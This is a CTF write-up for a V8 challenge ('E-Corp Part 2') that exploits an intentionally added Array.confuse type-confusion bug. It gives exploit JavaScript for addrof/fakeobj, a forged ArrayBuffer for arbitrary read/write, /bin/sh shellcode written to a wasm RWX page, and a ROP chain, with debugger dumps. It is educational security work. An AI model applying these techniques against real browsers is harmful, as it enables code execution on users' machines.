@@ -1,0 +1,585 @@
+---
+title: UTCTF 2025
+date: 2025-17-03
+category: Writeups
+excerpt: My first V8 challenge
+tags:
+  - pwn
+---
+
+import Challenge from "@components/Challenge.vue";
+
+UTCTF took place this weekend, and with a weight of 67.21 on CTFtime, there was
+no way our team could miss this CTF. However, the challenges weren't really that
+great or interesting, apart from a V8 chall (which I'm sure to pro V8 people is
+probably really boring, but not having done V8 before, I found it quite fun).
+Here's my writeup for the challenge!
+
+<Challenge
+  title="E-Corp Part 2"
+  solves={31}
+  flag="utflag{tH3_aRt_0f_c0nfU5!On}"
+  files={[{name: "e-corp.zip", url: "https://github.com/samuzora/filedump/releases/download/utctf-2025/e-corp.zip"}]}
+>
+Last year, your internship at E-Corp (Evil Corp) ended with a working router RCE
+exploit. Leadership was very impressed. As a result, we chose to extend a return
+offer. We used your exploit to get a MiTM position on routers around the world.
+Now, we want to be able to use that MiTM position to exploit browsers to further
+our world domination plans! This summer, you will need to exploit Chrome!
+
+One of our vulnerability researchers has discovered a new type confusion bug in
+Chrome. It turns out, a type confusion can be evoked by calling .confuse() on a
+PACKED_DOUBLE_ELEMENTS or PACKED_ELEMENTS array. The attached poc.js illustrates
+an example. You can run it with ./d8 ./poc.js. Once you have an RCE exploit, you
+will find a file with the flag in the current directory. Good luck and have fun!
+
+By Aadhithya (@aadhi0319 on discord)
+</Challenge>
+
+This is the patch diff in the provided dist files:
+
+```diff
+diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+index ea45a7ada6b..3af3bea5725 100644
+--- a/src/builtins/builtins-array.cc
++++ b/src/builtins/builtins-array.cc
+@@ -1589,5 +1589,44 @@ BUILTIN(ArrayConcat) {
+   return Slow_ArrayConcat(&args, species, isolate);
+ }
+ 
++// Custom Additions (UTCTF)
++
++BUILTIN(ArrayConfuse) {
++  HandleScope scope(isolate);
++  Factory *factory = isolate->factory();
++  Handle<Object> receiver = args.receiver();
++
++  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast<JSArray>(*receiver))) {
++    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
++      factory->NewStringFromAsciiChecked("Invalid type. Must be a JSArray.")));
++  }
++
++  Handle<JSArray> array = Cast<JSArray>(receiver);
++  ElementsKind kind = array->GetElementsKind();
++
++  if (kind == PACKED_ELEMENTS) {
++    DirectHandle<Map> map = JSObject::GetElementsTransitionMap(
++        array, PACKED_DOUBLE_ELEMENTS);
++    {
++      DisallowGarbageCollection no_gc;
++      Tagged<JSArray> raw = *array;
++      raw->set_map(*map, kReleaseStore);
++    }
++  } else if (kind == PACKED_DOUBLE_ELEMENTS) {
++    DirectHandle<Map> map = JSObject::GetElementsTransitionMap(
++        array, PACKED_ELEMENTS);
++    {
++      DisallowGarbageCollection no_gc;
++      Tagged<JSArray> raw = *array;
++      raw->set_map(*map, kReleaseStore);
++    }
++  } else {
++    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
++      factory->NewStringFromAsciiChecked("Invalid JSArray type. Must be an object or float array.")));
++  }
++
++  return ReadOnlyRoots(isolate).undefined_value();
++}
++
+ }  // namespace internal
+ }  // namespace v8
+```
+
+The primitive given to us is straightforward: type confusion between
+`PACKED_ELEMENTS` and `PACKED_DOUBLE_ELEMENTS`. To figure out the difference
+between the two, let's look at how the V8 engine represents different types of
+arrays.
+
+# Arrays in JavaScript
+
+> Just a side note, most pointers in recent versions of V8 are compressed, which
+> means that only the lower half of a pointer is stored, while the upper half is
+> an ASLR constant for all V8 objects. As a result, most pointers are 32-bit
+> even though they actually address 64-bit memory.
+
+In the V8 engine, objects are usually allocated on the V8 heap, which is part of
+a separate region called the sandbox. Each object on the V8 heap has a Map
+pointer which indicates its type, so that the engine knows how to
+dereference/read the values on the object. For an array, this is the memory
+layout:
+
+```
+0x00: Map (PACKED_ELEMENTS, PACKED_DOUBLE_ELEMENTS etc)
+0x04: properties (pointer to FixedArray)
+0x08: elements (pointer to FixedArray or FixedDoubleArray)
+0x0c: length
+```
+
+The actual contents of the array are stored in the `elements` pointer at `+0x8`.
+This is the layout for a `FixedArray`:
+
+```
+0x00: Map (FIXED_ARRAY_TYPE, FIXED_DOUBLE_ARRAY_TYPE etc)
+0x04: length
+0x08: arr[0]
+0x0c: arr[1]
+0x10: ...
+```
+
+When an array is indexed, the engine will first check the Map of the object. If
+it's one of the array types, it will check the `length` field to prevent OOB
+access, then get the value at the corresponding index in the `elements` array.
+Depending on the type of Map on the parent object, the final value returned to
+the user will be different, as besides integers and floats, all other objects
+are referenced by pointers. Integers and floats are stored using their actual
+values.
+
+> Because of pointer tagging, integers are actually stored by a
+> value twice the actual value, but that's not super important for the exploit.
+> I'll talk more about pointer tagging later!
+
+# Upgrading the primitive
+
+On calling `.confuse()`, the Map of the parent object is changed. This changes
+how the `elements` store is interpreted, as mentioned earlier.
+
+Since we can swap between regular arrays and float arrays, we have both our
+`addrof` and `fakeobj` primitive already. For `addrof`, we can change a
+`PACKED_ELEMENTS` type to `PACKED_DOUBLE_ELEMENTS` and read the pointers
+directly. For `fakeobj`, we can change `PACKED_DOUBLE_ELEMENTS` to
+`PACKED_ELEMENTS` on an array with pointers to our fake objects.
+
+> In V8 exploitation, `addrof` and `fakeobj` are 2 primitives that we usually
+> need to get in the V8 sandbox before we can upgrade to arbitrary r/w.
+
+## `addrof`
+
+Let's implement `addrof` first, then we can do the `fakeobj` with the leak we
+have.
+
+```js
+// helper functions
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+
+function fto64i(val) {
+  f64_buf[0] = val;
+  return Number(BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n))
+}
+
+function fto32i(val) {
+  f64_buf[0] = val
+  return Number(u64_buf[0])
+}
+
+function pack(v0, v1) {
+  u64_buf[0] = v0
+  u64_buf[1] = v1
+  return f64_buf[0]
+}
+
+function itof(val) {
+  u64_buf[0] = Number(val & 0xffffffffn);
+  u64_buf[1] = Number(val >> 32n);
+  return f64_buf[0];
+}
+
+let arr1 = [{}, {}]
+arr1.confuse();
+leak = fto32i(arr1[0])
+console.log("[*] leak: 0x" + leak.toString(16))
+```
+
+```
+[*] leak: 0x42e39
+```
+
+Here, we can see our leak! The reason why it's pointing to a seemingly unaligned
+address is because of pointer tagging as mentioned earlier. To differentiate
+between integers and pointers, the V8 engine sets the first bit of pointers to
+1, and stores integers as twice their actual value. Thus, if we see any
+pointers, we should always subtract 1 before using GDB to view the memory. We
+don't need to do this for the `job` command in GDB though.
+
+Since the address that we leaked was that of an
+object, we know it's in the V8 heap and probably a constant offset from `arr1`
+and any other arrays we define later. Let's test this out with our prospective
+`fakeobj`, which we'll create with a float array too.
+
+```js
+let fakeobj = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7]
+;%DebugPrint(fakeobj)
+```
+
+
+```
+[*] leak: 0x42e39
+DebugPrint: 0x270200042f15: [JSArray]
+ - map: 0x2702001cb86d <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
+ - prototype: 0x2702001cb1c5 <JSArray[0]>
+ - elements: 0x270200042ed5 <FixedDoubleArray[7]> [PACKED_DOUBLE_ELEMENTS]
+ - length: 7
+ - properties: 0x270200000725 <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x270200000d99: [String] in ReadOnlySpace: #length: 0x270200025fed <AccessorInfo name= 0x270200000d99 <String[6]: #length>, data= 0x270200000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
+ }
+ - elements: 0x270200042ed5 <FixedDoubleArray[7]> {
+           0: 1.1
+           1: 2.2
+           2: 3.3
+           3: 4.4
+           4: 5.5
+           5: 6.6
+           6: 7.7
+ }
+...
+```
+
+Yup, both pointers are in the `0x42xxx` region. Actually, these addresses don't
+change at all because of pointer compression, so we don't technically need the
+`addrof` primitive anymore. Well....
+
+```js
+let arr0 = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7]
+fakeobj_addr = leak - 0x58
+console.log("[*] fakeobj address: 0x" + fakeobj_addr.toString(16))
+
+console.log("[*] prepare arr2 to dereference the fake object")
+arr2[0] = itof(BigInt(fakeobj_addr))
+arr2.confuse()
+```
+
+## `fakeobj` to arb read/write
+
+Now, we need to find a target object that we want to forge, which should upgrade
+our primitive to arb r/w. The most commonly-used object is `ArrayBuffer{:js}`, because
+in non-sandboxed mode, it has a 64-bit unsandboxed pointer allocated on the
+binary's actual heap. This is one of the easiest ways to escape the V8 sandbox
+and start writing stuff to get our RCE. To create such a buffer and do
+read/write operations on it:
+
+```js
+let arraybuf = new ArrayBuffer(8)
+let dataview = new DataView(arraybuf)
+```
+
+Let's inspect the memory layout of the `ArrayBuffer{:js}`:
+
+```js
+let a = new ArrayBuffer(8)
+;%DebugPrint(a)
+```
+
+```ansi
+DebugPrint: 0x270200042f89: [JSArrayBuffer]
+ - map: 0x2702001c87b9 <Map[56](HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x2702001c894d <Object map = 0x2702001c87e1>
+ - elements: 0x270200000725 <FixedArray[0]> [HOLEY_ELEMENTS]
+ - cpp_heap_wrappable: 0
+ - backing_store: 0x55c64371c4f0
+ - byte_length: 8
+ - max_byte_length: 8
+ - detach key: 0x270200000069 <undefined>
+ - detachable
+ - properties: 0x270200000725 <FixedArray[0]>
+ - All own properties (excluding elements): {}
+...
+
+[32mpwndbg>[0m x/32wx 0x270200042f89-1
+[34m0x270200042f88[0m: 0x001c87b9      0x00000725      0x00000725      0x00000000
+[34m0x270200042f98[0m: 0x00000069      0x00000008      0x00000000      0x00000008
+[34m0x270200042fa8[0m: 0x00000000      [31;1m0x4371c4f0      0x000055c6[0m      0x00080040
+[34m0x270200042fb8[0m: 0x00000069      0x00000002
+```
+
+From this example `ArrayBuffer`, we can see that there are quite a few fields
+belonging to the struct. Of greatest interest is the 64-bit heap pointer, which
+we can use for the arbitrary read/write. As for the rest of the fields, let's
+just copy them into the fake object.
+
+```js
+arr0[0] = pack(JS_ARRAY_BUFFER_TYPE, 0x725)
+arr0[1] = pack(0x725, 0x0)
+arr0[2] = pack(0x69, 0x1000)
+arr0[3] = pack(0x0, 0x1000)
+arr0[4] = pack(0x0, Number(BigInt(leak) & 0xffffffffn))
+arr0[5] = pack(Number(BigInt(leak) >> 32n), 0x80040)
+arr0[6] = pack(0x69, 0x2)
+let dataview = new DataView(arr2[0])
+leak = dataview.getBigUint64(0, true) // or setBigUint64
+```
+
+This fake object should allow us to read/write using the get/set methods. Now we
+just need a target to get RCE.
+
+## RCE
+
+There are usually a few targets that we can use after getting arbitrary write.
+
+1. wasm rwx page
+2. JIT rwx page
+3. ROP (through `__free_hook`, `exit_funcs`, saved rip etc)
+
+I tried the wasm method, which worked locally (even in the provided Docker) but
+not on remote for some reason. In the end, I found a stack and pie leak and
+hence managed to do ROP.
+
+> I initially thought https://docs.kernel.org/core-api/protection-keys.html
+> was the issue, but apparently the JIT technique works well, so this might not
+> be it. According to @Linz in the Discord, it might be a kernel protection on
+> more modern Ubuntu 24.04.
+
+### wasm RWX technique
+
+When creating a `WebAssembly.Instance{:js}`, the V8 engine will allocate an rwx
+page and compile the WebAssembly into actual instructions to be executed. The
+idea is that the page is left as rwx, and hence if we can leak the address of
+this page, we can write shellcode to it, then call the function to get a shell.
+
+```js
+let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
+let wasm_mod = new WebAssembly.Module(wasm_code)
+let wasm_instance = new WebAssembly.Instance(wasm_mod)
+let f = wasm_instance.exports.main
+;%DebugPrint(wasm_instance)
+```
+
+```ansi
+DebugPrint: 0x3225001d4205: [WasmInstanceObject] in OldSpace
+ - map: 0x3225001cdc5d <Map[28](HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x3225001cdd09 <Object map = 0x3225001d41b5>
+ - elements: 0x322500000725 <FixedArray[0]> [HOLEY_ELEMENTS]
+ - trusted_data: 0x322500200355 <Other heap object (WASM_TRUSTED_INSTANCE_DATA_TYPE)>
+ - module_object: 0x322500043d39 <Module map = 0x3225001cdb35>
+ - shared_part: 0x3225001d4205 <Instance map = 0x3225001cdc5d>
+ - exports_object: 0x322500043e15 <Object map = 0x3225001d4379>
+ - properties: 0x322500000725 <FixedArray[0]>
+ - All own properties (excluding elements): {}
+
+[32mpwndbg>[0m x/32wx 0x3225001d4205-1
+[34m0x3225001d4206[0m: 0x001cdc5d      0x00000725      0x00000725      [31;1m0x00200355[0m
+[34m0x3225001d4214[0m: 0x00043d39      0x001d4205      0x00043e15      0x001cdeb9
+[34m0x3225001d4224[0m: 0x00000725      0x00000725      0x00043e49      0xfffffffe
+[34m0x3225001d4234[0m: 0x00000000      0x00043eb1      0x001c0201      0x2b020e0e
+[34m0x3225001d4244[0m: 0x0d00080e      0x084007ff      0x001c894d      0x001c87b9
+[34m0x3225001d4254[0m: 0x00043e81      0x00000735      0x00000a89      0x00000000
+[34m0x3225001d4264[0m: 0x00001edd      0x00000000      0x00000000      0xffffffff
+[34m0x3225001d4274[0m: 0x00000069      0x00000006      0x00000069      0x00000069
+```
+
+There are quite a few fields in the Instance object, but the one we're
+interested in is the `trusted_data` field at `+0xc`. This is a pointer to
+another object that holds the actual pointer to our rwx page, as seen below.
+
+```ansi
+[32mpwndbg>[0m vmmap
+LEGEND: [33mSTACK[0m | [34mHEAP[0m | [31mCODE[0m | [35mDATA[0m | [31;4mWX[0m | RODATA
+             Start                End Perm     Size Offset File
+    [31;4m0x2ff043ccc000     0x2ff043ccd000 rwxp     1000      0 [anon_2ff043ccc][0m
+    0x322500000000     0x322500010000 r--p    10000      0 [anon_322500000]
+    [32m0x322500010000     0x322500020000 ---p    10000      1 [anon_322500010][0m
+    0x322500020000     0x322500040000 r--p    20000      0 [anon_2a2100020]
+    [35m0x322500040000     0x322500143000 rw-p   103000      0 [anon_322500040][0m
+    [32m0x322500143000     0x322500180000 ---p    3d000      0 [anon_322500143][0m
+    [35m0x322500180000     0x322500181000 rw-p     1000      0 [anon_322500180][0m
+...
+
+[32mpwndbg>[0m x/16wx 0x322500200355-1
+[34m0x322500200354[0m: 0x00001f55      0x00200421      0x00200325      0x00000ed1
+[34m0x322500200364[0m: 0x44000000      0x00007f25      0x00010000      0x00000000
+[34m0x322500200374[0m: 0x6b3b9a80      0x000055da      0x00000000      0x00000000
+[34m0x322500200384[0m: [31;1m0x43ccc000      0x00002ff0[0m      0x6b3ac4f0      0x000055da
+```
+
+To get to this, we need to use our `addrof` primitive on both the wasm instance
+and the `trusted_data` object, as the addresses of these objects do change across
+runs.
+
+> The address of the `trusted_data` object is actually dependent on the length
+> of the exploit script (not including comments), so if the exploit doesn't
+> change, actually the `addrof` primitive isn't needed at all.
+
+This snippet will perform the required leaks.
+
+```js
+arr1[0] = wasm_instance
+let wasm_instance_addr = fto32i(arr1[0])
+console.log("[*] wasm instance addr: 0x" + wasm_instance_addr.toString(16))
+
+console.log("[*] get page addr")
+arr0[0] = pack(PACKED_DOUBLE_ELEMENTS, 0x725)
+arr0[1] = pack(wasm_instance_addr + 0xc - 0x8, 0x4)
+let trusted_data = fto32i(arr2[0][0])
+console.log("[*] trusted_data addr: 0x" + trusted_data.toString(16))
+arr0[0] = pack(PACKED_DOUBLE_ELEMENTS, 0x725)
+arr0[1] = pack(trusted_data + 0x30 - 0x8, 0x4)
+let page_addr = fto64i(arr2[0][0])
+console.log("[*] rwx page addr: 0x" + page_addr.toString(16))
+```
+
+Finally, all that's left is to write our shellcode to the rwx page and call the
+function we created. As mentioned earlier, we can use a fake `ArrayBuffer`
+object for this write primitive.
+
+```js
+console.log("[*] prepare array buffer")
+arr0[0] = pack(JS_ARRAY_BUFFER_TYPE, 0x725)
+arr0[1] = pack(0x725, 0x0)
+arr0[2] = pack(0x69, 0x1000)
+arr0[3] = pack(0x0, 0x1000)
+arr0[4] = pack(0x0, Number(BigInt(page_addr) & 0xffffffffn))
+arr0[5] = pack(Number(BigInt(page_addr) >> 32n), 0x80040)
+arr0[6] = pack(0x69, 0x2)
+
+console.log("[*] create dataview and write shellcode to rwx page")
+// https://shell-storm.org/shellcode/files/shellcode-806.html
+// \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
+var shellcode = Array(0x4).fill(0x90909090)
+shellcode = shellcode.concat([0x31c048bb,0xd19d9691,0xd08c97ff,0x48f7db53,0x545f9952,0x57545eb0,0x3b0f0500])
+let dataview = new DataView(arr2[0])
+for (let i = 0; i < shellcode.length; i++) {
+  console.log(dataview.getUint32(4 * i).toString(16))
+	dataview.setUint32(4 * i, shellcode[i], false)
+}
+
+console.log("[*] pop shell")
+f()
+```
+
+This works fine on local, but for some reason it didn't work on remote. There
+were a few people complaining in the Discord, but we were told to try another
+method. I'm very sure that the leaks are correct because I can read from the
+page, and the instructions tally with what I see on local as well. So the only
+other possible explanation is that the rwx page became w^x for some reason.
+After waiting a while for the admin to verify my solve, I became pretty sleepy
+and went to bed.
+
+### ROP via stack leak
+
+In the morning, I woke up to a closed ticket. Realizing there wasn't an easy way
+out, I decided to do a one gadget/ROP either through House of Apple or stack rip
+overwrite respectively. The plan was to leak something via the heap pointer that
+we first saw in the `ArrayBuffer` object. Most likely, there would be some libc
+addresses I could leak from unsorted chunks; I can then attack the file structs
+from there.
+
+We can use the arbitrary read to leak the heap pointer from the `ArrayBuffer`
+directly.
+
+```js
+console.log("[*] leak heap pointer in arraybuf")
+arr0[0] = pack(PACKED_DOUBLE_ELEMENTS, 0x725)
+arr0[1] = pack(arraybuf_addr + 0x1c, 0x8)
+heap_ptr = fto64i(arr2[0][0])
+console.log("[*] heap pointer: 0x" + heap_ptr.toString(16))
+```
+
+```ansi
+[32mpwndbg>[0m tel 0x556b4f039260 85
+00:0000│  [34m0x556b4f039260[0m ◂— 0
+... ↓     2 skipped
+03:0018│  [34m0x556b4f039278[0m ◂— 0x51 /* 'Q' */
+04:0020│  [34m0x556b4f039280[0m —▸ [34m0x556b4f039260[0m ◂— 0
+05:0028│  [34m0x556b4f039288[0m ◂— 8
+... ↓     2 skipped
+08:0040│  [34m0x556b4f0392a0[0m ◂— 2
+09:0048│  [34m0x556b4f0392a8[0m —▸ [33m0x7ffdb5921b10[0m —▸ 0x556b38cfa578 (vtable for v8::(anonymous namespace)::ShellArrayBufferAllocator+16) —▸ 0x556b37626a70 (v8::(anonymous namespace)::ArrayBufferAllocatorBase::~ArrayBufferAllocatorBase()) ◂— push rbp
+0a:0050│  [34m0x556b4f0392b0[0m ◂— 0
+...
+50:0280│  [34m0x556b4f0394e0[0m —▸ [34m0x556b4f036cf0[0m ◂— 0
+51:0288│  [34m0x556b4f0394e8[0m —▸ [35m0x7fe7b00c1b20 (main_arena+96)[0m —▸ [34m0x556b4f05cb70[0m ◂— 0
+52:0290│  [34m0x556b4f0394f0[0m ◂— 0
+53:0298│  [34m0x556b4f0394f8[0m ◂— 0x71 /* 'q' */
+54:02a0│  [34m0x556b4f039500[0m ◂— 0x556b4f039
+```
+
+Wow, both a stack leak and a libc leak! Even better, we have a convenient pie
+leak at the stack leak should we choose to use it. I soon realized that the
+libc leak from the `[35mmain_arena[0m{:ansi}` address was pretty unreliable
+as the chunks kept updating every time I do something in the script. The stack
+leak, however, is actually part of the chunk that we leaked, and so is much more
+reliable. Let's leak stack and pie via the `fakeobj` primitive.
+
+```js
+stack_leak = heap_ptr + 0x48
+console.log("[*] get stack leak from heap")
+console.log("[*] reading from 0x" + stack_leak.toString(16))
+arr0[0] = pack(JS_ARRAY_BUFFER_TYPE, 0x725)
+arr0[1] = pack(0x725, 0x0)
+arr0[2] = pack(0x69, 0x1000)
+arr0[3] = pack(0x0, 0x1000)
+arr0[4] = pack(0x0, Number(BigInt(stack_leak) & 0xffffffffn))
+arr0[5] = pack(Number(BigInt(stack_leak) >> 32n), 0x80040)
+arr0[6] = pack(0x69, 0x2)
+let dataview = new DataView(arr2[0])
+stack_leak = dataview.getBigUint64(0, true)
+console.log("[*] stack leak: 0x" + stack_leak.toString(16))
+
+console.log("[*] get pie leak from stack")
+console.log("[*] reading from 0x" + stack_leak.toString(16))
+arr0[4] = pack(0x0, Number(stack_leak & 0xffffffffn))
+arr0[5] = pack(Number(stack_leak >> 32n), 0x80040)
+pie_base = dataview.getBigUint64(0, true) - 0x288c578n
+console.log("[*] pie base: 0x" + pie_base.toString(16))
+```
+
+Now, a candidate stack target I had in mind was the saved rip at
+`__libc_start_call_main{:c}`. I tested by overwriting the value manually in GDB in both
+`--shell` and regular mode, and in both cases the program tries to return to my
+overwritten address, so this is definitely a viable write.
+
+```ansi
+[34mpwndbg>[0m tel 0x7ffdb5921b10+0x1b0
+00:0000│+b90 [33m0x7ffdb5921cc0[0m —▸ [33m0x7ffdb5921d60[0m —▸ [33m0x7ffdb5921dc0[0m ◂— 0
+01:0008│+b98 [33m0x7ffdb5921cc8[0m —▸ [31m0x7fe7aff00488(__libc_start_call_main+120)[0m ◂— mov edi, eax
+02:0010│+ba0 [33m0x7ffdb5921cd0[0m —▸ [35m0x7fe7b00c2fe8[0m (__exit_funcs_lock) ◂— 0
+03:0018│+ba8 [33m0x7ffdb5921cd8[0m —▸ [33m0x7ffdb5921de8[0m —▸ [33m0x7ffdb5922c11[0m ◂— '/home/samuzora/ctf/comp/2025-H0/utctf/e-corp/d8'
+04:0020│+bb0 [33m0x7ffdb5921ce0[0m ◂— 0x4b5921d20
+05:0028│+bb8 [33m0x7ffdb5921ce8[0m —▸ [31m0x556b37626aa0(main)[0m ◂— push rbp
+06:0030│+bc0 [33m0x7ffdb5921cf0[0m —▸ [33m0x7ffdb5921de8[0m —▸ [33m0x7ffdb5922c11[0m ◂— '/home/samuzora/ctf/comp/2025-H0/utctf/e-corp/d8'
+07:0038│+bc8 [33m0x7ffdb5921cf8[0m ◂— 0x90559e6d9909da04
+```
+
+Luckily, because of the vast number of gadgets in `d8`, the ROP part was very
+simple - just pop all the required registers, syscall, and win!
+
+```js
+// libc_start_call_main: -0x1b98 from bottom of stack, 0x1b8 from stack leak
+let libc_start_call_main = stack_leak + 0x1b8n
+let start_of_write = libc_start_call_main - 0x8n // space for binsh
+console.log("[*] write rop chain")
+console.log("[*] rop chain at libc_start_call_main: 0x" + libc_start_call_main.toString(16))
+arr0[4] = pack(0x0, Number(start_of_write & 0xffffffffn))
+arr0[5] = pack(Number(start_of_write >> 32n), 0x80040)
+
+let syscall = pie_base + 0x11976bcn
+let pop_rax = pie_base + 0x1195e45n
+let pop_rdi = pie_base + 0x133d0a1n
+let pop_rsi = pie_base + 0x1455417n
+let pop_rdx = pie_base + 0x12949e2n
+
+let binsh_string = 0x68732f6e69622fn
+let binsh_addr = start_of_write
+let rop_chain = [
+  binsh_string,
+  pop_rdi, binsh_addr,
+  pop_rsi, 0x0n,
+  pop_rdx, 0x0n,
+  pop_rax, 59n,
+  syscall
+]
+
+let stack_pos = 0
+for (let i = 0; i < rop_chain.length; i++) {
+  dataview.setBigUint64(i*8, rop_chain[i], true)
+```
+
+After overwriting the saved rip, exiting the `d8` binary will trigger the RCE.
+
+# Conclusion
+
+This was my very first V8 challenge and I'm quite happy to have solved it during
+the CTF. I learnt a lot about V8 internals, and will probably correct any wrong
+info in this writeup when I get better at V8. Excited to try solving more V8
+challs in the near future!
